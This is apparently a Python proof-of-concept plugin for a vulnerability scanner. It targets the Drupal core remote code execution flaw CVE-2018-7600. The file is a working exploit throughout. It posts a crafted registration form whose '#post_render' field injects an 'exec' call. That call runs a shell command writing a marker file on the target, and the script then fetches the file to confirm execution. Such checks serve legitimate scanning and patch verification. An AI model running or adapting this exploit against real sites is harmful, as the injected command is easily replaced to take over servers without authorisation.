# -*- coding: utf-8 -*-
# @Time   : 2018/4/14 下午3:14
# @author : Xmchx
# @File   : drupal_exec_7600.py

#https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py

import socket
import requests
from collections import OrderedDict
from kunscanner.lib.utils.utils import GetNetloc, RandomString
from kunscanner.lib.core.exception import PocWarningException
from kunscanner.lib.core.enums import SCRIPT_LEVEL



def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "drupal_exec_7600"
    poc_info['info'] = "drupal core remote code execution (CVE-2018-7600)"
    poc_info['title'] = u'Drupal远程命令执行'
    poc_info['author'] = "a2u"
    poc_info['time'] = "2018.04.14"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info



def Poc(url):
    init_url = url
    socket.setdefaulttimeout(5)
    result = {}
    result['success'] = False
    result['message'] = ''
    try:
        random_str = RandomString()
        url = GetNetloc(url, True)
        target = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo '+random_str+' | tee '+random_str+'.txt'}
        r = requests.post(target, data=payload, timeout = 5)
        if r.status_code != 200:
            return result
        else:
            r = requests.get(url+'/'+random_str+'.txt', timeout = 5)
            if r.status_code == 200 and random_str == r.text.strip():
                result['success'] = True
                result['message'] = 'random_file: /'+random_str+'.txt'
            return result
    except Exception,e:
        raise PocWarningException(init_url, Info()['name'], repr(e))